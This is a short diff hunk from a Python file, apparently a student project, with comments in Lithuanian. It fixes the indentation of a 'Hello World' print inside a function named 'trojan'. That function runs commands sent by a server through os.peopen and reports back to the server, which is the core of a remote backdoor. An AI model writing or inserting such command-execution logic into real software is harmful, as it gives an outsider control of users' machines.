@@ -23,7 +23,7 @@ def trojan():
             os.peopen(server_command)
         else: #arba ieškom komandų
             if server_command == "hello":
-            print("Hello World!")
+                print("Hello World!")
         client.send(f"{server_command} buvo įvykdyta sėkmingai!".encode('utf-8'))
 
 def spejimas():
